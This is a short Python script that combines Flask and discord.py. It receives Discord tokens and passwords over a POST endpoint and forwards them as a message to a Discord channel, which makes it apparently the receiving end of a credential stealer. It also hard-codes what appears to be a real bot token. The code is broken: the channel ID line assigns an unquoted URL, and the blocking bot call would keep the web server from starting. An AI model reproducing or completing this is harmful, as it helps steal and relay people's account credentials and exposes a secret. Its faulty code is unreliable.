from flask import Flask, request
import discord

app = Flask(__name__)
client = discord.Client()

@app.route('/send', methods=['POST'])
def send():
    data = request.json
    token = data['token']
    password = data['password']
    send_to_discord(token, password)
    return 'Data received and sent to Discord!'

def send_to_discord(token, password):
    channel_id = https://discord.com/channels/1207026777528991784/1207026778086842432  # Replace with your channel ID
    channel = client.get_channel(channel_id)
    message = f'Discord Token: {token}\nPassword: {password}'
    client.loop.create_task(channel.send(message))

@app.route('/')
def index():
    return 'Hello, World!'

client.run('MTIxNjMxNTk0ODU4ODMzOTIyMA.G3Sf--.GabWCUVwMVEiCSTEZwTxXw3IQBkuJMLTVRPeiY')
